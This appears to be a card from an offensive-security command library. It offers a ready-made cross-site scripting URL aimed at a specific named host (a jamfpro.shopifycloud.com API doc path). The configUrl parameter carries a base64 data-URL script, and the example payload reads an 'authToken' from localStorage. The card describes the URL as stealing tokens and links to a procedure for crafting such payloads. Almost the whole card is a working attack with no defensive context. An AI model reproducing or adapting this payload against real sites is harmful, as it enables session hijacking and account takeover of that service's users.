---
data: >-
  echo
  'https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,encoded-token-theft-payload'
tags:
  - xss
  - token-theft
type: command
executor: bash
platforms:
  - Web
id: 0b7ba0dd-4f92-444a-b84d-8bfee905de67
created_at: '2025-12-13T23:56:20.459Z'
updated_at: '2025-12-13T23:56:20.459Z'
verified: false
validated: true
submitted: true
---
# Open XSS Token Theft URL

## Command

```bash
echo 'https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,encoded-token-theft-payload'
```

## Description

Outputs a URL that steals tokens from localStorage via XSS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `configUrl` | Data URL with base64 JS for token access | Yes |

## Examples

### Basic Usage

```bash
echo 'https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,PHNjcmlwdD5hbGVydChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnYXV0aFRva2VuJykpPC9zY3JpcHQ+'
```

## Expected Output

URL that alerts or exfiltrates token when opened.

## Related

- [[procedures/Craft-XSS-Payload-for-Token-Theft]]
